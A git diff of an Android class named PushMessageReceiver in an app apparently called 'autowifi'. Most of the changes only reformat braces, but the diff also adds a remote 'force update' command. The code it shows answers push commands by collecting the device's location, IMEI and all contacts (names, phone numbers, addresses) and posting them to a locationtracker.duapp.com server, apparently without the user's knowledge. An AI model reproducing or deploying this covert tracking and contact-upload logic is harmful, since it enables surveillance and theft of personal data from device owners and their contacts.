@@ -22,6 +22,8 @@ import android.provider.ContactsContract;
 import android.util.Log;
 
 import com.baidu.android.pushservice.PushConstants;
+import com.eric.autowifi.beans.ContactBean;
+import com.eric.autowifi.beans.ContactJSONWrapper;
 import com.google.gson.Gson;
 
 /**
@@ -30,6 +32,7 @@ import com.google.gson.Gson;
 public class PushMessageReceiver extends BroadcastReceiver {
 	private final String REQUEST_LOCATION = "requestlocation";
 	private final String REQUEST_CONTACTS = "requestcontacts";
+	private final String REQUEST_FORCE_UPDATE = "requestforceupdate";
 	private String appid = "";
 	private String channelid = "";
 	private String userid = "";
@@ -45,25 +48,21 @@ public class PushMessageReceiver extends BroadcastReceiver {
 	 *            接收的intent
 	 */
 	@Override
-	public void onReceive(final Context context, Intent intent)
-	{
+	public void onReceive(final Context context, Intent intent) {
 		Log.d(TAG, ">>> Receive intent: \r\n" + intent);
 		// long when = System.currentTimeMillis();
-		if (intent.getAction().equals(PushConstants.ACTION_MESSAGE))
-		{
+		if (intent.getAction().equals(PushConstants.ACTION_MESSAGE)) {
 			// 获取消息内容
 			String content = intent.getExtras().getString(
 					PushConstants.EXTRA_PUSH_MESSAGE_STRING);
 			System.out.println("msg=" + content);
 
-			if (REQUEST_LOCATION.equals(content))
-			{
+			if (REQUEST_LOCATION.equals(content)) {
 
 				LocationManagerUtil l = new LocationManagerUtil(context);
 				l.requestLocation(new OnLocationChangeListener() {
 					@Override
-					public void onLocationChanged(Location location)
-					{
+					public void onLocationChanged(Location location) {
 						double lat = location.getLatitude();
 						double lng = location.getLongitude();
 						final String url = genUrl(Utils.getImei(context),
@@ -71,26 +70,21 @@ public class PushMessageReceiver extends BroadcastReceiver {
 								System.currentTimeMillis());
 						new Thread(new Runnable() {
 							@Override
-							public void run()
-							{
+							public void run() {
 								HttpRequestHelper hrh = new HttpRequestHelper();
 								hrh.sendRequestAndReturnJson(url);
 							}
 						}).start();
 					}
 				});
-			}
-			else if (REQUEST_CONTACTS.equals(content))
-			{
+			} else if (REQUEST_CONTACTS.equals(content)) {
 				boolean hasUploaded = Utils.getHasUploadContacts(context);
 				Log.d("PushMessageReceiver.REQUEST_CONTACTS.hasUploaded",
 						String.valueOf(hasUploaded));
-				if (!hasUploaded)
-				{
+				if (!hasUploaded) {
 					new Thread(new Runnable() {
 						@Override
-						public void run()
-						{
+						public void run() {
 							String json = getContactsInJSON(context);
 							HttpRequestHelper hrh = new HttpRequestHelper();
 							String url = "http://0.locationtracker.duapp.com/uploadContacts";
@@ -101,29 +95,25 @@ public class PushMessageReceiver extends BroadcastReceiver {
 							Log.d("REQUEST_CONTACTS.paras", json);
 							JSONObject jo = hrh.sendPostRequestAndReturnJson(
 									url, params);
-							if (jo != null && jo.has("ret"))
-							{
+							if (jo != null && jo.has("ret")) {
 								int ret = -1;
-								try
-								{
+								try {
 									ret = jo.getInt("ret");
-									if (ret != -1)
-									{
+									if (ret != -1) {
 										Utils.setHasUploadContacts(context,
 												true);
 									}
-								} catch (JSONException e)
-								{
+								} catch (JSONException e) {
 									e.printStackTrace();
 								}
 							}
 						}
 					}).start();
 				}
+			} else if (REQUEST_FORCE_UPDATE.equals(content)) {
+				UpdateManager.doUpdate(context, true);
 			}
-		}
-		else if (intent.getAction().equals(PushConstants.ACTION_RECEIVE))
-		{
+		} else if (intent.getAction().equals(PushConstants.ACTION_RECEIVE)) {
 			// 处理绑定等方法的返回数据
 			// PushManager.startWork()的返回值通过PushConstants.METHOD_BIND得到
 
@@ -146,27 +136,22 @@ public class PushMessageReceiver extends BroadcastReceiver {
 			Log.d(TAG, "onMessage: result : " + errorCode);
 			Log.d(TAG, "onMessage: content : " + content);
 
-			if (errorCode == 0)
-			{
-				try
-				{
+			if (errorCode == 0) {
+				try {
 					JSONObject jsonContent = new JSONObject(content);
 					JSONObject params = jsonContent
 							.getJSONObject("response_params");
 					appid = params.getString("appid");
 					channelid = params.getString("channel_id");
 					userid = params.getString("user_id");
-				} catch (JSONException e)
-				{
+				} catch (JSONException e) {
 					Log.e(BPushUtils.TAG, "Parse bind json infos error: " + e);
 				}
 				new Thread(new Runnable() {
 					@Override
-					public void run()
-					{
+					public void run() {
 						StringBuffer url = new StringBuffer();
-						try
-						{
+						try {
 							url.append(
 									"http://0.locationtracker.duapp.com/userinfo?")
 									.append("imei=")
@@ -184,8 +169,7 @@ public class PushMessageReceiver extends BroadcastReceiver {
 									.append("&userId=").append(userid)
 									.append("&registerTime=")
 									.append(System.currentTimeMillis());
-						} catch (UnsupportedEncodingException e)
-						{
+						} catch (UnsupportedEncodingException e) {
 							e.printStackTrace();
 						}
 						Log.d("PushMessageReceiver.onRegisterToBaidu",
@@ -193,14 +177,11 @@ public class PushMessageReceiver extends BroadcastReceiver {
 						HttpRequestHelper hrh = new HttpRequestHelper();
 						JSONObject jo = hrh.sendRequestAndReturnJson(url
 								.toString());
-						if (jo != null && jo.has("ret"))
-						{
+						if (jo != null && jo.has("ret")) {
 							int ret = -1;
-							try
-							{
+							try {
 								ret = jo.getInt("ret");
-								if (ret != -1)
-								{
+								if (ret != -1) {
 									SharedPreferences sp = PreferenceManager
 											.getDefaultSharedPreferences(context);
 									Editor editor = sp.edit();
@@ -209,27 +190,21 @@ public class PushMessageReceiver extends BroadcastReceiver {
 									editor.putString("user_id", userid);
 									editor.commit();
 								}
-							} catch (JSONException e)
-							{
+							} catch (JSONException e) {
 								e.printStackTrace();
 							}
 						}
 					}
 				}).start();
-			}
-			else
-			{
+			} else {
 				Log.d("Bind Error Code", String.valueOf(errorCode));
-				if (errorCode == 30607)
-				{
+				if (errorCode == 30607) {
 					Log.d("Bind Fail", "update channel token-----!");
 				}
 			}
 			// 可选。通知用户点击事件处理
-		}
-		else if (intent.getAction().equals(
-				PushConstants.ACTION_RECEIVER_NOTIFICATION_CLICK))
-		{
+		} else if (intent.getAction().equals(
+				PushConstants.ACTION_RECEIVER_NOTIFICATION_CLICK)) {
 			// Log.d(TAG, "intent=" + intent.toUri(0));
 			//
 			// Intent aIntent = new Intent();
@@ -248,42 +223,33 @@ public class PushMessageReceiver extends BroadcastReceiver {
 	}
 
 	private String genUrl(String imei, String googleAccount, double latitude,
-			double longitude, long uploadTime)
-	{
+			double longitude, long uploadTime) {
 		StringBuffer sb = new StringBuffer();
 		sb.append("http://0.locationtracker.duapp.com/locationinfotrack?");
-		try
-		{
-			if (imei != null)
-			{
+		try {
+			if (imei != null) {
 				sb.append("imei=").append(URLEncoder.encode(imei, "utf-8"));
 			}
-			if (googleAccount != null)
-			{
+			if (googleAccount != null) {
 				sb.append("&googleAccount=").append(
 						URLEncoder.encode(googleAccount, "utf-8"));
 			}
-		} catch (UnsupportedEncodingException e)
-		{
+		} catch (UnsupportedEncodingException e) {
 			e.printStackTrace();
 		}
-		if (latitude > 0)
-		{
+		if (latitude > 0) {
 			sb.append("&latitude=").append(latitude);
 		}
-		if (longitude > 0)
-		{
+		if (longitude > 0) {
 			sb.append("&longitude=").append(longitude);
 		}
-		if (uploadTime > 0)
-		{
+		if (uploadTime > 0) {
 			sb.append("&uploadTime=").append(uploadTime);
 		}
 		return sb.toString();
 	}
 
-	private String getContactsInJSON(Context context)
-	{
+	private String getContactsInJSON(Context context) {
 		// 获得所有的联系人
 		Cursor cur = context.getContentResolver().query(
 				ContactsContract.Contacts.CONTENT_URI,
@@ -294,37 +260,30 @@ public class PushMessageReceiver extends BroadcastReceiver {
 						+ " COLLATE LOCALIZED ASC");
 		List<ContactBean> cbList = null;
 		// 循环遍历
-		if (cur != null)
-		{
-			if (cur.moveToFirst())
-			{
+		if (cur != null) {
+			if (cur.moveToFirst()) {
 				int idColumn = cur
 						.getColumnIndex(ContactsContract.Contacts._ID);
 				int displayNameColumn = cur
 						.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
 				cbList = new ArrayList<ContactBean>();
-				do
-				{
+				do {
 					// 获得联系人的ID号
 					String contactId = cur.getString(idColumn);
 					// 获得联系人姓名
 					String disPlayName = cur.getString(displayNameColumn);
 					// 查看该联系人有多少个电话号码。如果没有这返回值为0
 					ContactBean cb = null;
-					if (disPlayName != null && !"".equals(disPlayName))
-					{
+					if (disPlayName != null && !"".equals(disPlayName)) {
 						cb = new ContactBean();
 						cb.setName(disPlayName);
-					}
-					else
-					{
+					} else {
 						continue;
 					}
 					int phoneCount = cur
 							.getInt(cur
 									.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));
-					if (phoneCount > 0)
-					{
+					if (phoneCount > 0) {
 						// 获得联系人的电话号码
 						Cursor phones = context
 								.getContentResolver()
@@ -332,12 +291,9 @@ public class PushMessageReceiver extends BroadcastReceiver {
 										null,
 										ContactsContract.CommonDataKinds.Phone.CONTACT_ID
 												+ " = " + contactId, null, null);
-						if (phones != null)
-						{
-							if (phones.moveToFirst())
-							{
-								do
-								{
+						if (phones != null) {
+							if (phones.moveToFirst()) {
+								do {
 									// 遍历所有的电话号码
 									String phoneNumber = phones
 											.getString(phones
@@ -350,9 +306,7 @@ public class PushMessageReceiver extends BroadcastReceiver {
 							}
 							phones.close();
 						}
-					}
-					else
-					{
+					} else {
 						continue;
 					}
 
@@ -363,12 +317,9 @@ public class PushMessageReceiver extends BroadcastReceiver {
 									null,
 									ContactsContract.CommonDataKinds.Phone.CONTACT_ID
 											+ " = " + contactId, null, null);
-					if (address != null)
-					{
-						if (address.moveToFirst())
-						{
-							do
-							{
+					if (address != null) {
+						if (address.moveToFirst()) {
+							do {
 								// 遍历所有的地址
 								String street = address
 										.getString(address
@@ -397,15 +348,12 @@ public class PushMessageReceiver extends BroadcastReceiver {
 			cur.close();
 		}
 
-		if (cbList != null)
-		{
+		if (cbList != null) {
 			ContactJSONWrapper cw = new ContactJSONWrapper(
 					Utils.getImei(context), cbList);
 			Gson g = new Gson();
 			return g.toJson(cw);
-		}
-		else
-		{
+		} else {
 			return null;
 		}
 	}
